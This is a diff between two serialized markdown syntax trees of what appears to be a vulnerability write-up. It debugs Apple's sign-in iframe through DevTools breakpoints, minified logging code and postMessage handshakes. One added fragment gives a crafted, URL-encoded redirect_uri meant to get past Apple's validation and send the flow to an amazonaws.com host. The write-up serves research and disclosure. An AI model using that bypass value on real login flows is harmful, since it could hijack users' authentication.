<               "line": 550,
<               "column": 56,
<               "offset": 26487
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". If an application does\nsomething, and we want to know why (in this case, why it won't load), we can set\nan 'XHR/fetch breakpoint' in Chrome Developer Tools's 'Sources' pane which looks\nfor that action -- in this case, loading\n",
<           "position": {
<             "start": {
<               "line": 550,
<               "column": 56,
<               "offset": 26487
<             },
<             "end": {
<               "line": 554,
<               "column": 1,
<               "offset": 26719
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https://idmsa.apple.com/appleauth/jslog",
<           "position": {
<             "start": {
<               "line": 554,
<               "column": 1,
<               "offset": 26719
<             },
<             "end": {
<               "line": 554,
<               "column": 42,
<               "offset": 26760
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". ",
<           "position": {
<             "start": {
<               "line": 554,
<               "column": 42,
<               "offset": 26760
<             },
<             "end": {
<               "line": 554,
<               "column": 44,
<               "offset": 26762
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 548,
<           "column": 1,
<           "offset": 26277
<         },
<         "end": {
<           "line": 554,
<           "column": 44,
<           "offset": 26762
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "5",
<       "label": "5",
<       "title": null,
<       "url": "https://hackerone.com/reports/409850",
<       "position": {
<         "start": {
<           "line": 556,
<           "column": 1,
<           "offset": 26766
<         },
<         "end": {
<           "line": 556,
<           "column": 42,
<           "offset": 26807
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "When the breakpoint fires (when the error occurs), the Javascript application\nwill be paused until we tell it to continue again, allowing us to look at what's\ngoing on. We can then use the call stack, representing the sequence of function\ncalls that got us there to look at all the things that happened to lead up to\nthis error.",
<           "position": {
<             "start": {
<               "line": 558,
<               "column": 1,
<               "offset": 26811
<             },
<             "end": {
<               "line": 562,
<               "column": 12,
<               "offset": 27143
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 558,
<           "column": 1,
<           "offset": 26811
<         },
<         "end": {
<           "line": 562,
<           "column": 12,
<           "offset": 27143
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "The breakpoint fires on a code context that looks like this:",
<           "position": {
<             "start": {
<               "line": 565,
<               "column": 1,
<               "offset": 27149
<             },
<             "end": {
<               "line": 565,
<               "column": 61,
<               "offset": 27209
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 565,
<           "column": 1,
<           "offset": 27149
<         },
<         "end": {
<           "line": 565,
<           "column": 61,
<           "offset": 27209
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "e.details && (e.details = JSON.stringify(e.details)),\nt && r(t);\ntry {\n    var o = new XMLHttpRequest;\n    o.open(a.METHOD, d, !0),\n    o.setRequestHeader(\"Content-type\", \"application/json\"),\n    o.setRequestHeader(\"Accept\", \"application/json\"),\n    o.setRequestHeader(\"scnt\", p),\n    o.setRequestHeader(\"x-csrf-token\", m),\n    o.addEventListener(\"error\", n),\n    o.addEventListener(\"abort\", n),\n    o.onreadystatechange = function() {\n        o.status\n    }\n    ,\n    \"OFF\" !== c && (\"INFO\" === c || \"ERROR\" === c ? \"ERROR\" !== e.type.toUpperCase().trim() && \"INFO\" !== e.type.toUpperCase().trim() || o.send(JSON.stringify(e)) : \"DEBUG\" === c && o.send(JSON.stringify(e)))\n} catch (e) {}\n\n",
<       "position": {
<         "start": {
<           "line": 567,
<           "column": 1,
<           "offset": 27213
<         },
<         "end": {
<           "line": 587,
<           "column": 4,
<           "offset": 27941
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "The Javascript code readers out there will probably be able to tell that this is just some pretty simple code which sends some arbitrary kind of information to the server.",
<           "position": {
<             "start": {
<               "line": 589,
<               "column": 1,
<               "offset": 27945
<             },
<             "end": {
<               "line": 589,
<               "column": 172,
<               "offset": 28116
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 589,
<           "column": 1,
<           "offset": 27945
<         },
<         "end": {
<           "line": 589,
<           "column": 172,
<           "offset": 28116
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If we step up in the call stack we get:",
<           "position": {
<             "start": {
<               "line": 591,
<               "column": 1,
<               "offset": 28120
<             },
<             "end": {
<               "line": 591,
<               "column": 40,
<               "offset": 28159
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 591,
<           "column": 1,
<           "offset": 28120
<         },
<         "end": {
<           "line": 591,
<           "column": 40,
<           "offset": 28159
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "x(),\nb.a.log({\n    type: ot.JSLOG.TYPES.INFO,\n    title: ot.JSLOG.TITLES.APPLE_AUTH_DEBUG,\n    message: \"Launching AppleAuth application.\",\n    iframeId: p.a.iframeId || \"\"\n});\ntry {\n    s.a.USE_AUTH_EVENTS ? ft() : setTimeout(function() {\n        ft()\n    }, p.a.meta.FEConfiguration.appLoadDelay)\n} catch (t) {\n    b.a.log({\n        type: ot.JSLOG.TYPES.ERROR,\n        title: t.name,\n        message: t.message,\n        stacktrace: t.stack,\n        details: {\n            file: t.fileName,\n            lineno: t.lineNumber,\n            colno: t.columnNumber,\n            caught: \"YES\"\n        },\n        iframeId: p.a.iframeId || \"\"\n    }),\n    ut()\n}\n",
<       "position": {
<         "start": {
<           "line": 593,
<           "column": 1,
<           "offset": 28163
<         },
<         "end": {
<           "line": 622,
<           "column": 4,
<           "offset": 28864
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "We're clearly getting somewhere. It looks like the server logging was triggered by a call to ",
<           "position": {
<             "start": {
<               "line": 624,
<               "column": 1,
<               "offset": 28868
<             },
<             "end": {
<               "line": 624,
<               "column": 94,
<               "offset": 28961
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "b.a.log()",
<           "position": {
<             "start": {
<               "line": 624,
<               "column": 94,
<               "offset": 28961
<             },
<             "end": {
<               "line": 624,
<               "column": 105,
<               "offset": 28972
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", which lets the system know what it's trying to do. The error we are likely seeing is from the ",
<           "position": {
<             "start": {
<               "line": 624,
<               "column": 105,
<               "offset": 28972
<             },
<             "end": {
<               "line": 624,
<               "column": 201,
<               "offset": 29068
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "try{} catch() {}",
<           "position": {
<             "start": {
<               "line": 624,
<               "column": 201,
<               "offset": 29068
<             },
<             "end": {
<               "line": 624,
<               "column": 219,
<               "offset": 29086
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " clause. Well, what are we trying?",
<           "position": {
<             "start": {
<               "line": 624,
<               "column": 219,
<               "offset": 29086
<             },
<             "end": {
<               "line": 624,
<               "column": 253,
<               "offset": 29120
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 624,
<           "column": 1,
<           "offset": 28868
<         },
<         "end": {
<           "line": 624,
<           "column": 253,
<           "offset": 29120
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "try {\n    s.a.USE_AUTH_EVENTS ? ft() : setTimeout(function() {\n        ft()\n    }, p.a.meta.FEConfiguration.appLoadDelay)\n} catch (t) {",
<       "position": {
<         "start": {
<           "line": 626,
<           "column": 1,
<           "offset": 29124
<         },
<         "end": {
<           "line": 632,
<           "column": 4,
<           "offset": 29283
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "There are two outcomes of this code: (1) the function ft() gets run immediately or (2) it gets run after a timeout specified by ",
<           "position": {
<             "start": {
<               "line": 634,
<               "column": 1,
<               "offset": 29287
<             },
<             "end": {
<               "line": 634,
<               "column": 129,
<               "offset": 29415
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "p.a.meta.FEConfiguration.applLoadDelay",
<           "position": {
<             "start": {
<               "line": 634,
<               "column": 129,
<               "offset": 29415
<             },
<             "end": {
<               "line": 634,
<               "column": 169,
<               "offset": 29455
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". What's ",
<           "position": {
<             "start": {
<               "line": 634,
<               "column": 169,
<               "offset": 29455
<             },
<             "end": {
<               "line": 634,
<               "column": 178,
<               "offset": 29464
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "ft()",
<           "position": {
<             "start": {
<               "line": 634,
<               "column": 178,
<               "offset": 29464
<             },
<             "end": {
<               "line": 634,
<               "column": 184,
<               "offset": 29470
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "? ",
<           "position": {
<             "start": {
<               "line": 634,
<               "column": 184,
<               "offset": 29470
<             },
<             "end": {
<               "line": 634,
<               "column": 186,
<               "offset": 29472
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "ft()",
<           "position": {
<             "start": {
<               "line": 634,
<               "column": 186,
<               "offset": 29472
<             },
<             "end": {
<               "line": 634,
<               "column": 192,
<               "offset": 29478
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", is, and I can't put this any other way -- a very beefy boy.",
<           "position": {
<             "start": {
<               "line": 634,
<               "column": 192,
<               "offset": 29478
<             },
<             "end": {
<               "line": 634,
<               "column": 253,
<               "offset": 29539
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 634,
<           "column": 1,
<           "offset": 29287
<         },
<         "end": {
<           "line": 634,
<           "column": 253,
<           "offset": 29539
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "heading",
<       "depth": 2,
<       "children": [
<         {
<           "type": "text",
<           "value": "Analysing the 'Beefy Boy'",
<           "position": {
<             "start": {
<               "line": 636,
<               "column": 1,
<               "offset": 29543
<             },
<             "end": {
<               "line": 636,
<               "column": 26,
<               "offset": 29568
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 636,
<           "column": 1,
<           "offset": 29543
<         },
<         "end": {
<           "line": 637,
<           "column": 26,
<           "offset": 29595
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "analysing the 'beefy boy'",
<       "label": "Analysing the 'Beefy Boy'",
<       "title": null,
<       "url": "#url-parsing-my-old-friend",
<       "position": {
<         "start": {
<           "line": 638,
<           "column": 1,
<           "offset": 29597
<         },
<         "end": {
<           "line": 638,
<           "column": 56,
<           "offset": 29652
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§6",
<       "label": "§6",
<       "title": null,
<       "url": "#url-parsing-my-old-frie",
<       "position": {
<         "start": {
<           "line": 639,
<           "column": 1,
<           "offset": 29654
<         },
<         "end": {
<           "line": 639,
<           "column": 31,
<           "offset": 29684
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": ") {\negeneratorRuntime.async(function(t) {\n(; ; )\nswitch (t.prev = t.next) {\ncase 0:\n    if (s.a.USE_AUTH_EVENTS)\n        return s.a.on(\"config\", function(e) {\n            return regeneratorRuntime.async(function(t) {\n                for (; ; )\n                    switch (t.prev = t.next) {\n                    case 0:\n                        return t.prev = 0,\n                        p.a.envConfigFromConsumer = $(e),\n                        t.next = 4,\n                        regeneratorRuntime.awrap(lt(p.a.envConfigFromConsumer.context));\n                    case 4:\n                        Q(),\n                        Y(p.a, pt),\n                        t.next = 12;\n                        break;\n                    case 8:\n                        t.prev = 8,\n                        t.t0 = t.catch(0),\n                        b.a.log({\n                            type: ot.JSLOG.TYPES.ERROR,\n                            title: ot.JSLOG.TITLES.PMRPC_MESSAGE_SEQUENCE_ERROR,\n                            message: \"PMRPC Message Sequence log fail at AuthWidget.\",\n                            iframeId: p.a.iframeId || \"\",\n                            details: {\n                                m: s.a.getLogs()\n                            }\n                        }),\n                        \"object\" === rt(c()(t.t0, \"jqXHR\", void 0)) ? ct(void 0, Object(v.b)(m.a.FAILED_TO_VALIDATE_CONTEXT, \"Provided context [ \".concat(p.a.envConfigFromConsumer.context, \" ] is not supported for this application.\"))) : (b.a.log({\n                            type: ot.JSLOG.TYPES.ERROR,\n                            title: ot.JSLOG.TITLES.APPLE_AUTH_DEBUG,\n                            message: c()(t.t0, \"message\", \"Unexpected error.\"),\n                            stacktrace: c()(t.t0, \"stack\", \"Stacktrace not found.\"),\n                            iframeId: p.a.iframeId || \"\"\n                        }),\n                        ut(t.t0));\n// ... way more after this ...",
<       "position": {
<         "start": {
<           "line": 641,
<           "column": 1,
<           "offset": 29688
<         },
<         "end": {
<           "line": 683,
<           "column": 4,
<           "offset": 31712
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This is code that no human was ever meant to read, produced by thousands of lines of machine optimization. And I'm sorry. But I love reading this stuff.",
<           "position": {
<             "start": {
<               "line": 685,
<               "column": 1,
<               "offset": 31716
<             },
<             "end": {
<               "line": 685,
<               "column": 153,
<               "offset": 31868
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 685,
<           "column": 1,
<           "offset": 31716
<         },
<         "end": {
<           "line": 685,
<           "column": 153,
<           "offset": 31868
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "A big part in making this code so inaccessible is the ",
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 1,
<               "offset": 31872
<             },
<             "end": {
<               "line": 687,
<               "column": 55,
<               "offset": 31926
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "regeneratorRuntime.async()",
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 55,
<               "offset": 31926
<             },
<             "end": {
<               "line": 687,
<               "column": 83,
<               "offset": 31954
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " call. ",
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 83,
<               "offset": 31954
<             },
<             "end": {
<               "line": 687,
<               "column": 90,
<               "offset": 31961
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "regeneratorRuntime",
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 90,
<               "offset": 31961
<             },
<             "end": {
<               "line": 687,
<               "column": 110,
<               "offset": 31981
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is a shim which lets code written for modern browsers supporting ",
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 110,
<               "offset": 31981
<             },
<             "end": {
<               "line": 687,
<               "column": 176,
<               "offset": 32047
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "async",
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 176,
<               "offset": 32047
<             },
<             "end": {
<               "line": 687,
<               "column": 183,
<               "offset": 32054
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and ",
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 183,
<               "offset": 32054
10794,10841d18205
<             "end": {
<               "line": 687,
<               "column": 188,
<               "offset": 32059
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "await",
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 188,
<               "offset": 32059
<             },
<             "end": {
<               "line": 687,
<               "column": 195,
<               "offset": 32066
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " run in older browsers. It will have been generated by a transpiler which analyzes the code to make it smaller, more efficient and support more browsers (almost certianly ",
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 195,
<               "offset": 32066
<             },
<             "end": {
<               "line": 687,
<               "column": 366,
<               "offset": 32237
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "linkReference",
<           "identifier": "6",
<           "label": "6",
<           "referenceType": "full",
<           "children": [
10843,10844c18207,18294
<               "type": "text",
<               "value": "Babel",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "I iterated over some possible options for this, and with much trial and tribulation worked out the best ",
>                   "position": {
>                     "start": {
>                       "line": 1037,
>                       "column": 1,
>                       "offset": 51375
>                     },
>                     "end": {
>                       "line": 1037,
>                       "column": 105,
>                       "offset": 51479
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri",
>                   "position": {
>                     "start": {
>                       "line": 1037,
>                       "column": 105,
>                       "offset": 51479
>                     },
>                     "end": {
>                       "line": 1037,
>                       "column": 119,
>                       "offset": 51493
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " was ",
>                   "position": {
>                     "start": {
>                       "line": 1037,
>                       "column": 119,
>                       "offset": 51493
>                     },
>                     "end": {
>                       "line": 1037,
>                       "column": 124,
>                       "offset": 51498
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https%3A%2F%2Fs3-eu-west-1.amazonaws.com%253F%20s3-eu-west-1.amazonaws.com%3B%40www.icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 1037,
>                       "column": 124,
>                       "offset": 51498
>                     },
>                     "end": {
>                       "line": 1037,
>                       "column": 220,
>                       "offset": 51594
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 1037,
>                       "column": 220,
>                       "offset": 51594
>                     },
>                     "end": {
>                       "line": 1037,
>                       "column": 221,
>                       "offset": 51595
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
10847,10849c18297,18299
<                   "line": 687,
<                   "column": 367,
<                   "offset": 32238
---
>                   "line": 1037,
>                   "column": 1,
>                   "offset": 51375
10852,10854c18302,18304
<                   "line": 687,
<                   "column": 372,
<                   "offset": 32243
---
>                   "line": 1037,
>                   "column": 221,
>                   "offset": 51595
10858,11146d18307
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 366,
<               "offset": 32237
<             },
<             "end": {
<               "line": 687,
<               "column": 376,
<               "offset": 32247
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ").",
<           "position": {
<             "start": {
<               "line": 687,
<               "column": 376,
<               "offset": 32247
<             },
<             "end": {
<               "line": 687,
<               "column": 378,
<               "offset": 32249
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 687,
<           "column": 1,
<           "offset": 31872
<         },
<         "end": {
<           "line": 687,
<           "column": 378,
<           "offset": 32249
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "6",
<       "label": "6",
<       "title": null,
<       "url": "https://babeljs.io/",
<       "position": {
<         "start": {
<           "line": 689,
<           "column": 1,
<           "offset": 32253
<         },
<         "end": {
<           "line": 689,
<           "column": 25,
<           "offset": 32277
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "We also don't need to worry about anything but ",
<           "position": {
<             "start": {
<               "line": 691,
<               "column": 1,
<               "offset": 32281
<             },
<             "end": {
<               "line": 691,
<               "column": 48,
<               "offset": 32328
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "case 8",
<           "position": {
<             "start": {
<               "line": 691,
<               "column": 48,
<               "offset": 32328
<             },
<             "end": {
<               "line": 691,
<               "column": 56,
<               "offset": 32336
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " here because that's where our ",
<           "position": {
<             "start": {
<               "line": 691,
<               "column": 56,
<               "offset": 32336
<             },
<             "end": {
<               "line": 691,
<               "column": 87,
<               "offset": 32367
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "PMRPC Sequence Message log Fail At AuthWidget",
<           "position": {
<             "start": {
<               "line": 691,
<               "column": 87,
<               "offset": 32367
<             },
<             "end": {
<               "line": 691,
<               "column": 134,
<               "offset": 32414
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " error is coming from. Case 0 is clearly doing some kind of arcane ritual to configure itself or something anyway and we shouldn't disturb it.",
<           "position": {
<             "start": {
<               "line": 691,
<               "column": 134,
<               "offset": 32414
<             },
<             "end": {
<               "line": 691,
<               "column": 276,
<               "offset": 32556
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 691,
<           "column": 1,
<           "offset": 32281
<         },
<         "end": {
<           "line": 691,
<           "column": 276,
<           "offset": 32556
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Case 8 is a sequence of ",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 1,
<               "offset": 32560
<             },
<             "end": {
<               "line": 693,
<               "column": 25,
<               "offset": 32584
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "Promise().then().then()",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 25,
<               "offset": 32584
<             },
<             "end": {
<               "line": 693,
<               "column": 50,
<               "offset": 32609
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "s which are another way other than ",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 50,
<               "offset": 32609
<             },
<             "end": {
<               "line": 693,
<               "column": 85,
<               "offset": 32644
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "async",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 85,
<               "offset": 32644
<             },
<             "end": {
<               "line": 693,
<               "column": 92,
<               "offset": 32651
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": "/",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 92,
<               "offset": 32651
<             },
<             "end": {
<               "line": 693,
<               "column": 93,
<               "offset": 32652
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "await",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 93,
<               "offset": 32652
<             },
<             "end": {
<               "line": 693,
<               "column": 100,
<               "offset": 32659
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " of managing asynchronous operations. If any ",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 100,
<               "offset": 32659
<             },
<             "end": {
<               "line": 693,
<               "column": 145,
<               "offset": 32704
11148,11517d18308
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "then()",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 145,
<               "offset": 32704
<             },
<             "end": {
<               "line": 693,
<               "column": 153,
<               "offset": 32712
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " operation fails, the ",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 153,
<               "offset": 32712
<             },
<             "end": {
<               "line": 693,
<               "column": 175,
<               "offset": 32734
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "catch()",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 175,
<               "offset": 32734
<             },
<             "end": {
<               "line": 693,
<               "column": 184,
<               "offset": 32743
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " clause is called, which results in us seeing the error we're seeing. Here's the first operation:",
<           "position": {
<             "start": {
<               "line": 693,
<               "column": 184,
<               "offset": 32743
<             },
<             "end": {
<               "line": 693,
<               "column": 281,
<               "offset": 32840
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 693,
<           "column": 1,
<           "offset": 32560
<         },
<         "end": {
<           "line": 693,
<           "column": 281,
<           "offset": 32840
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "new Promise(function(e, n) {\n    it.call({\n        destination: window.parent,\n        publicProcedureName: \"ready\",\n        params: [{\n            iframeTitle: d.a.getString(\"iframeTitle\")\n        }],\n        onSuccess: function(t) {\n            e(t)\n        },\n        onError: function(t) {\n            n(t)\n        },\n        retries: p.a.meta.FEConfiguration.pmrpcRetryCount,\n        timeout: p.a.meta.FEConfiguration.pmrpcTimeout,\n        destinationDomain: p.a.destinationDomain\n    })\n}",
<       "position": {
<         "start": {
<           "line": 695,
<           "column": 1,
<           "offset": 32844
<         },
<         "end": {
<           "line": 714,
<           "column": 4,
<           "offset": 33375
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "inlineCode",
<           "value": "window.parent",
<           "position": {
<             "start": {
<               "line": 716,
<               "column": 1,
<               "offset": 33379
<             },
<             "end": {
<               "line": 716,
<               "column": 16,
<               "offset": 33394
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is the key here. ",
<           "position": {
<             "start": {
<               "line": 716,
<               "column": 16,
<               "offset": 33394
<             },
<             "end": {
<               "line": 716,
<               "column": 34,
<               "offset": 33412
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "window.parent",
<           "position": {
<             "start": {
<               "line": 716,
<               "column": 34,
<               "offset": 33412
<             },
<             "end": {
<               "line": 716,
<               "column": 49,
<               "offset": 33427
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is a reference to the embedding window (i.e. in the correct case, iCloud). and it's calling \"ready\". I imagine it expects a response and since we're not giving one it's failing. As far as this gets us, it's kind of something we could already intuit as it's how all these systems really work. We're going to have to snoop on a successful initialization conversation and try to replicate it.",
<           "position": {
<             "start": {
<               "line": 716,
<               "column": 49,
<               "offset": 33427
<             },
<             "end": {
<               "line": 716,
<               "column": 439,
<               "offset": 33817
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 716,
<           "column": 1,
<           "offset": 33379
<         },
<         "end": {
<           "line": 716,
<           "column": 439,
<           "offset": 33817
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Snooping on the successful ",
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 1,
<               "offset": 33821
<             },
<             "end": {
<               "line": 718,
<               "column": 28,
<               "offset": 33848
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 28,
<               "offset": 33848
<             },
<             "end": {
<               "line": 718,
<               "column": 41,
<               "offset": 33861
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " traffic that the real ",
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 41,
<               "offset": 33861
<             },
<             "end": {
<               "line": 718,
<               "column": 64,
<               "offset": 33884
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "icloud.com",
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 64,
<               "offset": 33884
<             },
<             "end": {
<               "line": 718,
<               "column": 76,
<               "offset": 33896
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " makes is not easy, especially in this case. If you use Google Chrome Devtools, like I do to write these vulnerabilities, you won't find ",
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 76,
<               "offset": 33896
<             },
<             "end": {
<               "line": 718,
<               "column": 213,
<               "offset": 34033
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "postMessage",
<           "position": {
<             "start": {
<               "line": 718,
<               "column": 213,
<               "offset": 34033
<             },
<             "end": {
<               "line": 718,
<               "column": 226,
<               "offset": 34046
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
